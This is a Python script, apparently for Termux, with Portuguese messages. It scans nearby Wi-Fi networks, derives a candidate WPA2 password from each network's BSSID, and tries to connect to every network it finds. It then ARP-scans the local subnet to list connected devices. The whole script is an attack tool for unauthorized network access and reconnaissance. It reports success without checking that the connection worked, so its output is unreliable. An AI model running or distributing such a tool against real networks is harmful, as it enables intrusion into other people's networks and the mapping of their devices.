import subprocess
import time
import os

ctrl_iface_dir = '/var/run/wpa_supplicant'
os.makedirs(ctrl_iface_dir, exist_ok=True)

def verificar_e_instalar_dependencias():
    try:
        import pywifi
        from scapy.all import ARP, Ether, srp
    except ImportError:
        print("As dependências 'pywifi' e 'scapy' não estão instaladas.")
        instalar_dependencias()

def instalar_dependencias():
    try:
        subprocess.run(["pkg", "install", "python"], check=True)
        subprocess.run(["pkg", "install", "clang"], check=True)
        subprocess.run(["pkg", "install", "libxml2", "libxml2-dev", "libxslt", "libxslt-dev"], check=True)
        subprocess.run(["pip", "install", "pywifi", "scapy"], check=True)
        print("As dependências 'pywifi' e 'scapy' foram instaladas com sucesso.")
    except subprocess.CalledProcessError:
        print("Erro ao instalar as dependências 'pywifi' e 'scapy'. Certifique-se de que o Termux está corretamente configurado e tente novamente.")

def obter_dispositivos_conectados():
    arp = ARP(pdst="192.168.0.1/24")
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    pacote = ether/arp

    resultado = srp(pacote, timeout=3, verbose=0)[0]

    dispositivos = []

    for sent, received in resultado:
        dispositivos.append({'IP': received.psrc, 'MAC': received.hwsrc})

    return dispositivos

def calcular_senha(bssid):
    bssid = bssid.replace(":", "")
    bssid = bssid[2:]
    return bssid

def executar_script_wifi_termux():
    verificar_e_instalar_dependencias()

    import pywifi
    from scapy.all import ARP, Ether, srp

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.enable()

    networks = []

    while True:
        # Obter as redes Wi-Fi disponíveis
        iface.scan()
        time.sleep(5)  # Tempo para o escaneamento das redes

        # Limpar a lista de redes existentes
        networks = []

        # Atualizar a lista de redes disponíveis
        scan_results = iface.scan_results()
        for network in scan_results:
            if network not in networks:
                networks.append(network)

        for network in networks:
            senha_wifi = calcular_senha(network.bssid)

            perfil = pywifi.Profile()
            perfil.ssid = network.ssid
            perfil.auth = pywifi.const.AUTH_ALG_OPEN
            perfil.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
            perfil.cipher = pywifi.const.CIPHER_TYPE_CCMP
            perfil.key = senha_wifi

            iface.remove_all_network_profiles()
            temp_profile = iface.add_network_profile(perfil)
            iface.connect(temp_profile)

            print(f"Conectado à rede Wi-Fi: {network.ssid} - BSSID: {network.bssid} - Senha: {senha_wifi}")

        time.sleep(60)  # Aguardar 1 minuto antes de atualizar novamente

        dispositivos_conectados = obter_dispositivos_conectados()

        print("\nDispositivos conectados na rede:")
        for dispositivo in dispositivos_conectados:
            print(f"IP: {dispositivo['IP']} - MAC: {dispositivo['MAC']}")

executar_script_wifi_termux()
